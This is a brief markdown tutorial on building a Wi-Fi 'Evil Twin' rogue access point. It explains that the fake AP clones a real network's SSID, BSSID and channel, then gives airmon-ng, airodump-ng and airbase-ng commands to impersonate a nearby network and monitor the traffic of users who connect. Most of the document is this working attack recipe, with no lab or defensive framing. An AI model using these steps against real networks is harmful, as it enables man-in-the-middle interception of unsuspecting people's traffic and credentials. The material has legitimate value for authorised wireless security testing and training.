# Harvesting connections with an Evil Twin.

> Evil Twin is a rogue access point which has been activated in order to attract unwary users to connect and then acts as a MITM monitoring their traffic.
> It does this by posing as a legitimate AP. A good Evil Twin will look in every aspect the same as its target (SSID, BSSID and channel) but with a stronger signal in its local zone.
> An Evil Twin may just wait for new devices to join the network, or it may forcibly de-authenticate clients from the legitimate AP t o force a reconnect, this time to itself.

**1.** Set up _airbase-ng_, a simple Kali tool for turning a wireless card into an AP. Firt, with monitor mode.

```bash
airmon-ng start wlan0
```

**2.** See what APs are close.

```bash
airodump-ng wlan0mon
```

**3.** Evil Twin it and wait for users to authenticate.

```bash
airbase-ng -a $BSSID --essid $SSID -c $CHANNELNUM wlan0mon
```

**4.** Monitor the traffic.
